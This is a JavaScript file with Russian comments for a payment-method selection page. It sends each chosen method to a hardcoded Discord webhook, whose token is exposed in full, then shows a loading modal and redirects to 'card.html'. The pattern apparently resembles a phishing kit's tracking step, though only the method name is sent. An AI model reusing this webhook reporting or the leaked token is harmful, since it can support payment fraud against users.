// URL вашего вебхука Discord
const discordWebhookUrl = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';  // Замените на свой вебхук

// Функция для обработки выбора метода оплаты
document.querySelectorAll('.payment-option').forEach(option => {
    option.addEventListener('click', function() {
      // Убираем выделение с других методов оплаты
      document.querySelectorAll('.payment-option').forEach(option => option.classList.remove('selected'));
  
      // Добавляем выделение для выбранного метода
      this.classList.add('selected');
  
      // Извлекаем метод оплаты
      const method = this.getAttribute('data-method');
      console.log(`Выбран метод: ${method}`);
  
      // Отображаем уведомление о выбранном методе
      document.getElementById('selected-method').textContent = method;
      document.getElementById('notification').style.display = 'block';
  
      // Отправляем данные на Discord
      sendToDiscord(method);
  
      // Активируем кнопку перехода к оплате
      const checkoutBtn = document.getElementById('checkout-btn');
      checkoutBtn.href = "card.html"; 
    });
});

// Отправка данных на вебхук Discord
function sendToDiscord(paymentMethod) {
    const message = {
        content: `Пользователь выбрал способ оплаты: ${paymentMethod}`,
    };

    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Успех:', data);
    })
    .catch((error) => {
        console.error('Ошибка:', error);
    });
}

// Модальное окно для загрузки
const loadingModal = document.getElementById('loading-modal');

// Модальное окно ошибки
const modal = document.getElementById('modal');
const modalClose = document.getElementById('modal-close');

// Ожидание клика по кнопке "Перейти к оплате"
document.getElementById('checkout-btn').addEventListener('click', function(e) {
    if (!document.querySelector('.selected')) {
        e.preventDefault();
        // Показать модальное окно ошибки
        modal.style.display = 'flex';
        return;
    }

    // Показать модальное окно загрузки
    loadingModal.style.display = 'flex';

    // Задержка 5 секунд перед переходом на другую страницу
    setTimeout(function() {
        // Переход на другую страницу
        window.location.href = 'card.html';  // Замените на ваш реальный путь
    }, 10000);
});

// Закрытие модального окна ошибки
modalClose.addEventListener('click', function() {
    modal.style.display = 'none';
});

// Закрытие модального окна при клике вне его области
window.addEventListener('click', function(e) {
    if (e.target === modal) {
        modal.style.display = 'none';
    }
});
